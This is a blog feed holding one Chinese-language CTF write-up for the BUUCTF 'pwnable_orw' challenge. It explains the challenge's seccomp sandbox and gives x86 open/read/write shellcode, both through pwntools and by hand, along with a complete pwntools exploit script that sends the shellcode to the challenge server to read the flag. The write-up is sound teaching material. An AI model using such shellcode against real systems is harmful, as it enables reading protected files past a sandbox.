{
    "version": "https://jsonfeed.org/version/1",
    "title": "Blog • All posts by \"shellcode\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/09/22/pwn/%E5%88%B7%E9%A2%98/BUUCTF/orw/",
            "url": "https://vvwwvv.cn/2023/09/22/pwn/%E5%88%B7%E9%A2%98/BUUCTF/orw/",
            "title": "pwnable_orw（手写汇编之shellcode，沙盒机制）",
            "date_published": "2023-09-22T09:08:15.000Z",
            "content_html": "<h1 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h1>\n<p>32 位程序，没有开启 NX，初步认为可以利用 <code>shellcode</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmrOe.png\" alt=\"\" /></p>\n<p>ida 查看<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTm6wd.png\" alt=\"\" /><br />\n看到有一个  <code>orw_seccomp()</code> ， <code>seccomp函数</code> 是一个沙盒机制</p>\n<p>进去查看（关于沙盒详情见文章 <code>沙盒机制</code> ）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmWfP.png\" alt=\"\" /></p>\n<p>利用工具 <code>seccomp-tools</code>  查看具体过滤情况，<br />\n使用命令 <code>seccomp-tools dump ./orw</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmaJx.png\" alt=\"\" /></p>\n<p>看到我们可以使用  <code>open/read/write</code>  函数，可以写入执行这几个的函数的 <code>shellcode</code>  来读取 <code>flag</code></p>\n<ol>\n<li>通过 <code>open</code>  打开 flag 文件</li>\n<li>利用 <code>read</code>  读取 flag 到某一地址</li>\n<li>利用 <code>write</code>  输出这个地址的 flag 即可</li>\n</ol>\n<h1 id=\"2shellcode-构造\"><a class=\"anchor\" href=\"#2shellcode-构造\">#</a> 2.shellcode 构造</h1>\n<p>利用系统调用方式：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTuPKS.png\" alt=\"\" /></p>\n<h2 id=\"1利用shellcraft构造\"><a class=\"anchor\" href=\"#1利用shellcraft构造\">#</a> 1. 利用 shellcraft 构造</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode<span class=\"token operator\">=</span>shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./flag\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token string\">'eax'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#此处 eax 为 3（打开 0，1，2 标准输入，标准输出，标准错误）</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#read 函数的 fd 之所以是 3，是因为默认情况下，0,1,2 这三个句柄对应的是标准输入，标准输出，标准错误，系统进程默认会打开 0，1，2 这三个文件描述符。所以通常我们 open 的返回值是从 3 开始的（系统调用返回值会保存在 eax 中）</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#记得要用 asm 转成汇编</span></pre></td></tr></table></figure><h2 id=\"2手动构造\"><a class=\"anchor\" href=\"#2手动构造\">#</a> 2. 手动构造</h2>\n<p>1. 调用 open 打开 flag 文件：88</p>\n<p>调用函数为 <code>sys_open(const *path,0,0)</code></p>\n<pre><code>push 0x0 #字符串是以\\x00结尾\npush 0x67616c66 #flag的ascill码，小端序（66 &quot;f&quot; ,6c &quot;l&quot; ,61 &quot;a&quot; ,67 &quot;g&quot;）\nmov ebx,esp\nxor    ecx,ecx\nxor    edx,edx\nmov  eax, 0x5\nint     0x80\n</code></pre>\n<p>这里解释为什么先要 <code>push 0x0</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTl3y6.png\" alt=\"\" /></p>\n<p>2. 调用 read 读取 flag</p>\n<p>调用函数为 <code>read(0x3,esp,0x100)</code> (0x3 为文件描述符 0,1,2，写入到 esp，这一部分 esp 没有进行调用不会被影响)</p>\n<pre><code>mov ebx,0x3\nmov ecx,esp\nmov edx, 0x100\nmov eax,0x3\nint     0x80\n</code></pre>\n<p>3. 调用 write 将 flag 从上面写入的位置输出到屏幕</p>\n<p>调用的函数为 <code>write(0x1,esp,0x100)</code></p>\n<pre><code>mov ebx,0x1\nmov ecx,esp\nmov edx,0x100\nmov eax, 0x4\nint   0x80\n\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\" ;    ;    ;      ; \"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"只有这里最后一个不用加分号\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里就构造完毕 shellcode 了</p>\n<h1 id=\"3exp\"><a class=\"anchor\" href=\"#3exp\">#</a> 3.exp:</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./orw')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27810</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#shellcode = (shellcraft.open(\"./flag\"))</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#shellcode+=(shellcraft.read('eax','esp',100))</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#shellcode+=(shellcraft.write(1,'esp',100))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>shellcode<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push 0x0 ;push 0x67616c66 ;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax, 0x5;int 0x80;\"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>shellcode<span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov ebx,0x3;mov ecx,0x804A0A0;mov edx, 0x100;mov eax,0x3;int 0x80;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>shellcode<span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov ebx,0x1;mov ecx,0x804A0A0;mov edx,0x100;mov eax, 0x4;int 0x80\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"your shellcode:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#payload1=p32()+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#payload1=p64()+p64()+p64()+p64()</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,\"b *\")</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#gdb.attach(pid)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#p.recvuntil(\"\")</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#payload2=p32()+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#payload2=p64()+p64()+p64()+p64()</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#p.sendline(payload2)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>本地仍然打不通，应该是环境问题</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/23/pPTY8OI.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        }
    ]
}